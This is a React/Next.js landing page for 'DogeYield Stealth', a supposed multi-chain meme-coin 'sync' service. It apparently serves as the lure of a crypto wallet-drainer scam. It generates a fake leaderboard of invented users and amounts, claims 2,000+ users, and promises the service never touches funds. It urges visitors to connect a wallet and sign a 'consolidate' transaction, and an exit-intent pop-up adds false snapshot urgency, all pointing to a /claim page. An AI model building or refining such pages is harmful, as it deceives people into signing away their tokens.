'use client';
import React, { useMemo, useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import Link from 'next/link';

// Fake leaderboard data generator
const NAMES = [
  'dogeHodlr', 'syncMaster', 'memeWhale', 'yieldWolf', 'chainQueen', 'arbKing', 'polyPup', 'bscBaron', 'ethEagle', 'optimist',
];
const AVATARS = [
  '🐶', '🦊', '🐺', '🦁', '🐻', '🐸', '🐵', '🐼', '🦄', '🐲',
];
function getFakeLeaderboard() {
  // Use a deterministic seed based on the current 2-hour window
  const now = new Date();
  const epoch = Math.floor(now.getTime() / (1000 * 60 * 60 * 2));
  // Shuffle names and avatars
  const shuffled = NAMES.map((name, i) => ({
    name,
    avatar: AVATARS[i % AVATARS.length],
    amount: 1000 + ((epoch * (i + 3)) % 9000),
  })).sort((a, b) => b.amount - a.amount);
  return shuffled.slice(0, 5);
}

export default function Home() {
  const leaderboard = useMemo(getFakeLeaderboard, []);
  const [showPopup, setShowPopup] = useState(false);
  const [popupDismissed, setPopupDismissed] = useState(false);

  useEffect(() => {
    if (popupDismissed) return;
    const handleMouseMove = (e: MouseEvent) => {
      if (e.clientY < 40) {
        setShowPopup(true);
      }
    };
    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, [popupDismissed]);

  return (
    <>
      <section className="min-h-screen flex flex-col items-center justify-center text-center px-4 bg-[url('/hero-bg.jpg')] bg-cover bg-center">
        <motion.h1
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.7 }}
          className="text-5xl md:text-7xl font-bold tracking-tight"
        >
          DogeYield Stealth
        </motion.h1>
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3 }}
          className="mt-4 max-w-xl text-xl text-yellow-200 font-semibold"
        >
          Effortlessly manage your meme-coin portfolio across Ethereum, BSC, Polygon, Arbitrum, and Optimism.
        </motion.p>
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5 }}
          className="mt-2 max-w-lg text-lg text-gray-300"
        >
          Built for real holders. No hidden fees. No nonsense. Just seamless, secure asset consolidation.
        </motion.p>
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ delay: 0.7 }}
          className="mt-10 w-full max-w-2xl"
        >
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <div className="bg-black/60 rounded-lg p-6 flex flex-col items-center">
              <span className="text-3xl">⚡</span>
              <h3 className="mt-2 text-lg font-bold">Instant Sync</h3>
              <p className="text-gray-400 mt-1 text-sm">Move your assets in seconds. No waiting, no stress.</p>
            </div>
            <div className="bg-black/60 rounded-lg p-6 flex flex-col items-center">
              <span className="text-3xl">🔐</span>
              <h3 className="mt-2 text-lg font-bold">Non-Custodial</h3>
              <p className="text-gray-400 mt-1 text-sm">You stay in control. We never touch your funds or keys.</p>
            </div>
            <div className="bg-black/60 rounded-lg p-6 flex flex-col items-center">
              <span className="text-3xl">🌐</span>
              <h3 className="mt-2 text-lg font-bold">Multi-Chain</h3>
              <p className="text-gray-400 mt-1 text-sm">All major EVM chains supported. One dashboard, total clarity.</p>
            </div>
          </div>
          <Link href="/claim">
            <button className="w-full md:w-auto bg-yellow-400 text-black px-10 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition">
              Start Syncing
            </button>
          </Link>
        </motion.div>
        {/* Leaderboard Section */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.9 }}
          className="mt-16 max-w-xl w-full"
        >
          <div className="bg-black/80 rounded-lg p-6 shadow-lg">
            <h2 className="text-2xl font-bold mb-4 text-yellow-300 flex items-center justify-center gap-2">
              <span>🏆</span> Top Synchronizers <span className="text-xs text-gray-400 ml-2">(updates every 2h)</span>
            </h2>
            <ol className="space-y-2">
              {leaderboard.map((user, i) => (
                <li key={user.name} className={`flex items-center justify-between px-4 py-2 rounded-lg ${i === 0 ? 'bg-yellow-900/40' : 'bg-gray-800/40'}`}>
                  <div className="flex items-center gap-3">
                    <span className="text-2xl">{user.avatar}</span>
                    <span className="font-semibold text-yellow-100">{user.name}</span>
                  </div>
                  <span className="text-yellow-300 font-bold">{user.amount.toLocaleString()} DOGE</span>
                </li>
              ))}
            </ol>
          </div>
        </motion.div>
        {/* End Leaderboard Section */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1 }}
          className="mt-16 max-w-2xl w-full"
        >
          <div className="bg-black/70 rounded-lg p-6 shadow-lg">
            <h2 className="text-2xl font-bold mb-2 text-yellow-300">How it Works</h2>
            <ol className="list-decimal list-inside text-left text-gray-200 space-y-1 mx-auto max-w-lg">
              <li>Connect your wallet (MetaMask or any EVM-compatible wallet).</li>
              <li>Choose the chains and assets you want to sync.</li>
              <li>Sign a single transaction to consolidate your tokens.</li>
              <li>Track your new, unified portfolio in the dashboard.</li>
            </ol>
          </div>
        </motion.div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1.2 }}
          className="mt-12 max-w-2xl w-full"
        >
          <div className="bg-black/70 rounded-lg p-6 shadow-lg flex flex-col md:flex-row items-center gap-6">
            <div className="flex-1 text-left">
              <h2 className="text-xl font-bold text-yellow-300 mb-2">Why DogeYield Stealth?</h2>
              <ul className="list-disc list-inside text-gray-200 space-y-1">
                <li>Open-source, transparent codebase</li>
                <li>No platform tokens, no airdrop farming</li>
                <li>Community-driven support and updates</li>
                <li>Used by real DeFi users, not bots</li>
              </ul>
            </div>
            <div className="flex-1 flex flex-col items-center">
              <span className="text-4xl mb-2">🤝</span>
              <span className="text-gray-400">Join 2,000+ holders already using DogeYield Stealth</span>
              <a href="https://twitter.com/" target="_blank" rel="noopener noreferrer" className="mt-2 text-yellow-400 underline">Follow us on Twitter</a>
            </div>
          </div>
        </motion.div>
      </section>
      {/* Exit-Intent Pop-up */}
      <AnimatePresence>
        {showPopup && !popupDismissed && (
          <motion.div
            initial={{ opacity: 0, y: 40 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 40 }}
            transition={{ duration: 0.3 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/40"
          >
            <div className="bg-brand-900 rounded-xl shadow-2xl p-8 max-w-sm w-full text-center border-2 border-yellow-400 relative">
              <button
                onClick={() => setPopupDismissed(true)}
                className="absolute top-2 right-3 text-gray-400 hover:text-yellow-400 text-2xl font-bold"
                aria-label="Close"
              >
                ×
              </button>
              <div className="text-4xl mb-2">⏰</div>
              <h2 className="text-2xl font-bold text-yellow-300 mb-2">Missed rewards?</h2>
              <p className="text-gray-200 mb-6">Sync before the snapshot ends and make sure you don’t miss out on your portfolio rewards.</p>
              <Link href="/claim">
                <button
                  onClick={() => setPopupDismissed(true)}
                  className="bg-yellow-400 text-black px-8 py-3 rounded-full text-lg font-semibold hover:bg-yellow-500 transition"
                >
                  Sync Now
                </button>
              </Link>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
} 